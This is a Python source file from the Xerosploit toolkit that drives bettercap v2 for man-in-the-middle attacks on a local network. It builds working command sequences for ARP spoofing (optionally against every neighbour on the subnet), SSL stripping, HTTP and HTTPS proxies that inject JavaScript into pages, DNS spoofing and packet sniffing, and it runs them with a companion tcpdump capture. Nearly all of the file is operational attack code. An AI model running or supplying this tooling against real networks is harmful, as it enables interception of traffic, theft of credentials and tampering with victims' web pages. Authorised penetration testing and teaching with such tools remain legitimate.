#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#---------------------------------------------------------------------------#
# This file is part of Xerosploit.                                          #
# Xerosploit is free software: you can redistribute it and/or modify        #
# it under the terms of the GNU General Public License as published by      #
# the Free Software Foundation, either version 3 of the License, or         #
# (at your option) any later version.                                       #
#                                                                           #
# Xerosploit is distributed in the hope that it will be useful,             #
# but WITHOUT ANY WARRANTY; without even the implied warranty of            #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the             #
# GNU General Public License for more details.                              #
#                                                                           #
# You should have received a copy of the GNU General Public License         #
# along with Xerosploit.  If not, see <http://www.gnu.org/licenses/>.       #
#                                                                           #
#---------------------------------------------------------------------------#
#                                                                           #
#        Copyright © 2019 Neodrix (www.neodrix.com)                         #
#                                                                           #
#---------------------------------------------------------------------------#
#
# bettercap v2 (Go) orchestrator.  Single place that knows how to talk to
# bettercap; the UI code (xerosploit.py) must never build bettercap command
# strings itself.  See docs/PORT-SPEC.md sections 3, 4, 5 and 6.

import ipaddress
import json
import os
import shutil
import signal
import subprocess
import sys

# ------------------------------------------------------------------------- #
# Paths (PORT-SPEC section 3)
# ------------------------------------------------------------------------- #
#
# BASE_DIR is the absolute directory of the running xerosploit.py.  Since this
# module lives in <BASE_DIR>/lib/, the base directory is the parent of the
# directory holding this file.  This makes the tool work both from the git
# checkout and from /opt/xerosploit.

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS_DIR = os.path.join(BASE_DIR, "tools")
FILES_DIR = os.path.join(TOOLS_DIR, "files")
LOG_DIR = os.path.join(TOOLS_DIR, "log")
TMP_DIR = os.path.join(TOOLS_DIR, "tmp")
MODULES_DIR = os.path.join(BASE_DIR, "modules")


class EngineError(Exception):
    """Raised when the bettercap v2 engine cannot be located or used."""


# Grace period (seconds) to let bettercap restore the ARP cache after Ctrl+C
# before escalating to SIGTERM / SIGKILL.
_GRACE_SECONDS = 15
_TERMINATE_SECONDS = 5

# Characters that would break bettercap's ';'-separated -eval command list (or
# truncate a C string); every value interpolated into a command is checked.
_FORBIDDEN_CHARS = (";", "\n", "\r", "\0")


# ------------------------------------------------------------------------- #
# Engine discovery and module paths
# ------------------------------------------------------------------------- #

def bettercap_bin():
    """Resolve the bettercap v2 binary, raising EngineError when missing."""
    path = shutil.which("bettercap")
    if path is None:
        raise EngineError(
            "[!] bettercap v2 was not found in PATH.\n"
            "    Install it before running Xerosploit, for example:\n"
            "      apt-get update && apt-get install -y bettercap\n"
            "    Kali Linux and Parrot OS ship bettercap v2 in their repositories."
        )
    return path


def script(module_file):
    """Absolute path of a proxy JS module under MODULES_DIR."""
    _validate(module_file, "module file name")
    return os.path.abspath(os.path.join(MODULES_DIR, str(module_file)))


# ------------------------------------------------------------------------- #
# Helpers
# ------------------------------------------------------------------------- #

def _validate(value, what):
    """Reject values that would break a bettercap '-eval' command list.

    bettercap splits -eval on ';', and a raw newline/NUL would truncate the
    command, so any value interpolated into a command must be clean.
    """
    if value is None:
        return value
    text = str(value)
    for ch in _FORBIDDEN_CHARS:
        if ch in text:
            shown = {"\n": "\\n", "\r": "\\r", "\0": "\\0"}.get(ch, ch)
            raise EngineError(
                "[!] Invalid %s: it must not contain %r (this would break the "
                "bettercap command list)." % (what, shown)
            )
    return value


def require_file(path, what="input file"):
    """Validate and return the absolute path of an existing regular file."""
    _validate(path, what)
    if not path or not os.path.isfile(path):
        raise EngineError("[!] %s not found: %s" % (what, path))
    return os.path.abspath(path)


def _targets_str(targets, what="target"):
    if isinstance(targets, (list, tuple, set)):
        items = [str(t) for t in targets]
    else:
        items = [str(targets)]
    for item in items:
        _validate(item, what)
    return ",".join(items)


def _js_literal(value):
    """Render a python value as a JavaScript literal (strings, lists, bools)."""
    return json.dumps(value)


def _param_global(name):
    return "XE_" + str(name).upper()


# ------------------------------------------------------------------------- #
# Network discovery (used by the UI's "all" target and ARP defaults)
# ------------------------------------------------------------------------- #

def _run_ip(args):
    """Run a read-only `ip` command and return its stdout (raises on failure)."""
    try:
        proc = subprocess.run(
            ["ip"] + list(args),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
    except OSError as exc:
        raise EngineError("[!] Failed to run 'ip %s': %s" % (" ".join(args), exc))
    return proc.stdout or ""


def _default_iface():
    for line in _run_ip(["route", "show", "default"]).splitlines():
        parts = line.split()
        if "dev" in parts:
            return parts[parts.index("dev") + 1]
    return None


def _default_gateway(iface=None):
    args = ["route", "show", "default"]
    if iface:
        args += ["dev", str(iface)]
    for line in _run_ip(args).splitlines():
        parts = line.split()
        if "via" in parts:
            return parts[parts.index("via") + 1]
    return None


def _neighbour_ips(iface):
    """IPv4 addresses from `ip neigh show dev <iface>`."""
    ips = []
    for line in _run_ip(["neigh", "show", "dev", str(iface)]).splitlines():
        parts = line.split()
        if not parts:
            continue
        try:
            ipaddress.IPv4Address(parts[0])
        except ValueError:
            continue
        ips.append(parts[0])
    return ips


def _iface_ipv4(iface):
    """Our own IPv4 address on <iface> (or None)."""
    for line in _run_ip(["-4", "-o", "addr", "show", "dev", str(iface)]).splitlines():
        parts = line.split()
        if "inet" in parts:
            return parts[parts.index("inet") + 1].split("/")[0]
    return None


def _iface_network(iface):
    """Our IPv4 network in CIDR form, e.g. 192.168.1.5/24 -> 192.168.1.0/24."""
    for line in _run_ip(["-4", "-o", "addr", "show", "dev", str(iface)]).splitlines():
        parts = line.split()
        if "inet" not in parts:
            continue
        cidr = parts[parts.index("inet") + 1]
        try:
            return str(ipaddress.ip_network(cidr, strict=False))
        except ValueError:
            continue
    return None


def all_targets(iface=None):
    """Expand the UI's "all" command into a concrete bettercap target value.

    Prefers the live neighbour table (excluding our own address and the default
    gateway); when that is empty, falls back to the interface's IPv4 network in
    CIDR form.  Raises EngineError when neither can be determined, because
    bettercap refuses to start arp.spoof with an empty target list.
    """
    if iface is None:
        iface = _default_iface()
    if not iface:
        raise EngineError(
            "[!] Cannot expand 'all': no default network interface was found."
        )

    own = _iface_ipv4(iface)
    gateway = _default_gateway(iface)
    excluded = {addr for addr in (own, gateway) if addr}
    neighbours = [ip for ip in _neighbour_ips(iface) if ip not in excluded]
    if neighbours:
        return ",".join(neighbours)

    network = _iface_network(iface)
    if network:
        return network

    raise EngineError(
        "[!] Cannot expand 'all': no live neighbours and no IPv4 network were "
        "found on interface %s." % iface
    )


# ------------------------------------------------------------------------- #
# bettercap v2 command builders -> list[str] of session commands
# ------------------------------------------------------------------------- #

def arp_spoof(targets, internal=False, fullduplex=True):
    """ARP spoofing commands for an explicit, non-empty target list.

    Empty/None targets raise EngineError instead of silently omitting
    `set arp.spoof.targets`: bettercap refuses to start arp.spoof without
    targets ("list of targets is empty, module not starting"), so the old
    behaviour was a silent no-op.  `internal=False` (the default) keeps the
    poisoning scoped to target<->gateway; `internal=True` broadens it far
    beyond that.  `net.probe on` is always included -- without it bettercap
    cannot resolve the target MAC and spoofs nothing (see the comment below).
    """
    if not targets:
        raise EngineError(
            "[!] arp.spoof requires at least one target; refusing to start with "
            "an empty target list (bettercap would not start the module)."
        )
    cmds = ["set arp.spoof.targets " + _targets_str(targets, "arp target")]
    if internal:
        cmds.append("set arp.spoof.internal true")
    cmds.append("set arp.spoof.fullduplex " + ("true" if fullduplex else "false"))
    # bettercap turns each target into a MAC by reading the operating system's ARP
    # table (session.FindMAC -> network.ArpLookup), and the spoofing loop calls that
    # with probe=false, so a target this host has not exchanged traffic with
    # recently is dropped from the target map: the module then warns "could not
    # find spoof targets" every interval while spoofing nothing at all.  net.probe
    # sends a UDP packet to every address of the interface subnet, which forces the
    # kernel to ARP-resolve them and fills that table, so start it before arp.spoof.
    cmds.append("net.probe on")
    cmds.append("arp.spoof on")
    return cmds


def http_proxy(script=None, port=8080, sslstrip=False, address=None):
    """HTTP proxy commands.  `script` is an absolute proxy JS module path.

    bettercap's built-in `http.proxy.injectjs` is intentionally NOT used: it
    consumes the response body and only restores it on an exact lowercase
    `</head>`, so it can return empty/broken pages.  Injection goes through a
    real proxy module (`script=`) instead.
    """
    cmds = []
    if port is not None:
        _validate(str(port), "proxy port")
        try:
            port_num = int(port)
        except (TypeError, ValueError):
            raise EngineError("[!] Invalid proxy port: %r" % (port,))
        cmds.append("set http.proxy.port %d" % port_num)
    if address:
        _validate(address, "proxy address")
        cmds.append("set http.proxy.address " + str(address))
    if sslstrip:
        cmds.append("set http.proxy.sslstrip true")
    if script:
        _validate(script, "proxy script path")
        cmds.append("set http.proxy.script " + str(script))
    cmds.append("http.proxy on")
    return cmds


def https_proxy(sslstrip=False):
    """HTTPS proxy commands (TLS interception with bettercap certificates)."""
    cmds = []
    if sslstrip:
        cmds.append("set https.proxy.sslstrip true")
    cmds.append("https.proxy on")
    return cmds


def net_sniff(output=None, local=False, verbose=True):
    """Network sniffer commands, optionally writing a pcap to `output`."""
    cmds = []
    if output:
        _validate(output, "sniff output path")
        cmds.append("set net.sniff.output " + str(output))
    cmds.append("set net.sniff.local " + ("true" if local else "false"))
    cmds.append("set net.sniff.verbose " + ("true" if verbose else "false"))
    cmds.append("net.sniff on")
    return cmds


def dns_spoof(domains, address):
    """DNS spoofing commands redirecting `domains` to `address`."""
    cmds = []
    if domains:
        joined = _targets_str(domains, "dns domain")
        if joined.strip() == "*":
            # `dns.spoof.domains=*` is bettercap's wildcard domain list, while
            # `dns.spoof.all=true` means "also spoof DNS traffic not addressed
            # to us"; the latter is the closest equivalent for "every domain".
            cmds.append("set dns.spoof.all true")
        else:
            cmds.append("set dns.spoof.domains " + joined)
            if "*" in joined:
                cmds.append("set dns.spoof.all true")
    _validate(address, "dns spoof address")
    cmds.append("set dns.spoof.address " + str(address))
    cmds.append("dns.spoof on")
    return cmds


# ------------------------------------------------------------------------- #
# Runtime proxy modules (PORT-SPEC section 6)
# ------------------------------------------------------------------------- #

def write_runtime_module(module_file, params):
    """Generate tools/tmp/proxy-<name>.js = generated preamble + module body.

    The preamble declares XE_BASE_DIR, XE_TMP_DIR and one XE_<UPPER> global per
    entry in `params`.  Returns the absolute path of the generated file.
    """
    if not params:
        params = {}

    name = os.path.splitext(os.path.basename(module_file))[0]
    body_path = script(module_file)
    if not os.path.isfile(body_path):
        raise EngineError("[!] Proxy module not found: " + body_path)

    os.makedirs(TMP_DIR, exist_ok=True)
    out_path = os.path.join(TMP_DIR, "proxy-" + name + ".js")

    lines = [
        "// generated by lib/engine.py -- do not edit",
        "var XE_BASE_DIR = " + _js_literal(BASE_DIR) + ";",
        "var XE_TMP_DIR = " + _js_literal(TMP_DIR) + ";",
    ]
    for key, value in params.items():
        if isinstance(value, str):
            _validate(value, "module parameter %s" % key)
        elif isinstance(value, (list, tuple, set)):
            for item in value:
                _validate(item, "module parameter %s" % key)
        lines.append("var " + _param_global(key) + " = " + _js_literal(value) + ";")
    lines.append("// >>> module body below <<<")

    with open(body_path, "r", encoding="utf-8") as fh:
        body = fh.read()

    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
        fh.write(body)
        if not body.endswith("\n"):
            fh.write("\n")

    return os.path.abspath(out_path)


# ------------------------------------------------------------------------- #
# Packet capture sniffer helper (PORT-SPEC section 3 & 4)
# ------------------------------------------------------------------------- #

def sniffer_bin():
    """Return (name, path) of the best available packet capture tool, or (None, None)."""
    for candidate in ("tcpdump", "dumpcap"):
        path = shutil.which(candidate)
        if path:
            return candidate, path
    return None, None


def build_bpf_filter(targets):
    """Convert targets (IP, CIDR, or list/comma-separated) to a BPF filter expression."""
    if not targets:
        return ""
    if isinstance(targets, (list, tuple, set)):
        raw_items = [str(t).strip() for t in targets]
    else:
        raw_items = [str(targets).strip()]
    items = []
    for raw in raw_items:
        for sub in raw.split(","):
            sub = sub.strip()
            if sub:
                items.append(sub)
    if not items:
        return ""
    parts = []
    for item in items:
        if "/" in item:
            parts.append("net " + item)
        else:
            parts.append("host " + item)
    if len(parts) == 1:
        return parts[0]
    return " or ".join(parts)


def _start_sniffer(iface, output, targets=None):
    """Start an external packet capture process writing to `output`.

    Bettercap v2.41+ has a known upstream bug in its pcapng writer (interface index
    mismatch) which causes `net.sniff.output` to produce empty 124-byte pcap files
    on modern Linux distributions. Running tcpdump/dumpcap alongside bettercap
    ensures packet captures are complete, uncorrupted and reliable.
    """
    if not output:
        return None
    name, path = sniffer_bin()
    if not name:
        sys.stderr.write(
            "\033[1;33m[!] Warning: neither tcpdump nor dumpcap found; "
            "pcap file capture will be skipped.\033[1;m\n"
        )
        return None

    parent = os.path.dirname(os.path.abspath(output))
    os.makedirs(parent, exist_ok=True)

    bpf = build_bpf_filter(targets)

    if name == "tcpdump":
        argv = [path, "-U", "-s", "0"]
        if os.geteuid() == 0:
            argv += ["-Z", "root"]
        if iface:
            argv += ["-i", str(iface)]
        argv += ["-w", str(output)]
        if bpf:
            argv.append(bpf)
    else:
        argv = [path]
        if iface:
            argv += ["-i", str(iface)]
        argv += ["-w", str(output)]
        if bpf:
            argv += ["-f", bpf]

    try:
        proc = subprocess.Popen(
            argv,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return proc
    except Exception as exc:
        sys.stderr.write(
            "\033[1;33m[!] Warning: failed to launch %s: %s\033[1;m\n" % (name, exc)
        )
        return None


def _stop_sniffer(proc):
    """Gracefully terminate a packet capture process and ensure output is flushed."""
    if proc is None or proc.poll() is not None:
        return
    try:
        proc.send_signal(signal.SIGINT)
        proc.wait(timeout=2)
    except (subprocess.TimeoutExpired, OSError):
        try:
            proc.terminate()
            proc.wait(timeout=1)
        except (subprocess.TimeoutExpired, OSError):
            try:
                proc.kill()
                proc.wait(timeout=1)
            except OSError:
                pass


# ------------------------------------------------------------------------- #
# Runner
# ------------------------------------------------------------------------- #

def run(iface, commands, logfile=None, caplet=None, extra_eval=None, pcap_output=None, pcap_targets=None):
    """Launch one bettercap session and block until it exits.

    Composes `bettercap -iface <iface> [-autostart ""] [-caplet <file>]
    -eval "<cmd; cmd; ...>"` and returns the bettercap exit code.

    `logfile` is honoured through bettercap's event stream
    (`events.stream.output`) because bettercap v2 has no `-log` flag.  Since
    `-autostart` defaults to `events.stream` and autostart runs *before*
    `-eval`, a lone `set events.stream.output` in `-eval` would be ignored; when
    a logfile is requested we therefore pass `-autostart ""` and enable the
    stream ourselves at the front of the command list.

    `pcap_output`, when given, triggers a companion packet capture using
    tcpdump/dumpcap scoped to `pcap_targets` and flushed upon exit.

    Ctrl+C is delivered to bettercap through the shared foreground process
    group; bettercap then prompts `... quit this session? y/n` on the tty, so we
    answer `y` to let it restore the ARP cache before timing out.
    """
    argv = [bettercap_bin()]
    if iface:
        argv += ["-iface", str(iface)]

    session_commands = list(commands or [])
    if logfile:
        _validate(logfile, "log file path")
        # bettercap v2 has no -log flag; redirect the event stream to the file
        # instead (modules/events_stream: events.stream.output).  This must run
        # before the module commands, and -autostart must be disabled because it
        # would start events.stream before -eval is parsed.
        session_commands = [
            "set events.stream.output " + str(logfile),
            "events.stream on",
        ] + session_commands
        argv += ["-autostart", ""]
    if extra_eval:
        session_commands.append(extra_eval)
    if caplet:
        argv += ["-caplet", str(caplet)]
    if session_commands:
        argv += ["-eval", "; ".join(session_commands)]

    sys.stdout.flush()
    sys.stderr.flush()

    sniffer_proc = None
    if pcap_output:
        sniffer_proc = _start_sniffer(iface, pcap_output, pcap_targets)

    try:
        # Same process group as us, so the terminal's Ctrl+C reaches bettercap too.
        proc = subprocess.Popen(argv)
        try:
            return proc.wait()
        except KeyboardInterrupt:
            # bettercap is showing its "quit this session? y/n" prompt on the shared
            # tty; answer yes so it can restore the ARP cache before exiting.
            print("\n\033[1;34m[++] Telling bettercap to quit and restore the ARP cache ...\033[1;m")
            sys.stdout.flush()
            _answer_bettercap_quit_prompt()
            # Ignore further Ctrl+C while bettercap cleans up, so a second hit
            # cannot kill the ARP-cache restoration.
            previous = signal.signal(signal.SIGINT, signal.SIG_IGN)
            try:
                try:
                    return proc.wait(timeout=_GRACE_SECONDS)
                except subprocess.TimeoutExpired:
                    proc.terminate()
                    try:
                        return proc.wait(timeout=_TERMINATE_SECONDS)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        return proc.wait()
            finally:
                signal.signal(signal.SIGINT, previous)
    finally:
        _stop_sniffer(sniffer_proc)


def _answer_bettercap_quit_prompt():
    """Write "y" to the controlling tty to accept bettercap's quit prompt."""
    try:
        with open("/dev/tty", "w") as tty:
            tty.write("y\n")
        tty.flush()
    except OSError:
        # No controlling tty (e.g. a piped run); fall through to the timeout path.
        pass

